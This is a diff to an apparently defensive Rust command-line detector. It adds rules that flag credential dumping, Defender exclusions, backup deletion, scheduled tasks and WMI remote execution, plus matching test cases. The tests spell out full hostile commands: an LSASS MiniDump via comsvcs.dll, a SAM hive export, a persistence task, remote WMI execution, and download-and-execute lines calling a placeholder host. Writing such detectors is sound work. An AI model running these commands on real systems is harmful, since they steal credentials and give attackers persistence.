@@ -80,6 +80,15 @@ const CMDLINE_RULES: &[(&str, &str)] = &[
     ("ufw disable", "disable firewall"),
     ("ld_preload=", "preload hijack"),
     ("ld.so.preload", "preload hijack"),
+    ("minidump", "credential dump"),
+    ("sekurlsa", "credential dump"),
+    ("reg save hklm\\sam", "credential dump"),
+    ("reg save hklm\\security", "credential dump"),
+    ("add-mppreference -exclusionpath", "defender exclusion"),
+    ("recoveryenabled no", "disable recovery"),
+    ("wbadmin delete catalog", "delete backup"),
+    ("schtasks /create", "scheduled task"),
+    ("process call create", "wmi exec"),
 ];
 
 /// Per-process features after Yoon et al., "Structure-Aware Malicious Behavior
@@ -358,6 +367,10 @@ mod tests {
             ("certutil -urlcache -f http://x/a.exe a.exe", &["certutil abuse"]),
             ("vssadmin Delete Shadows /all /quiet", &["delete shadow copies"]),
             ("powershell -ep bypass -c iex (iwr http://x)", &["execution policy bypass", "invoke expression"]),
+            (r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\l.dmp full", &["credential dump"]),
+            (r"reg save HKLM\SAM C:\Users\Public\s.hiv", &["credential dump"]),
+            ("schtasks /Create /SC ONLOGON /TN u /TR c:\\u.exe", &["scheduled task"]),
+            ("wmic /node:10.0.0.5 process call create \"cmd /c x\"", &["wmi exec"]),
         ];
         for (cmd, want) in cases {
             assert_eq!(cmdline_rules(cmd), *want, "{cmd}");
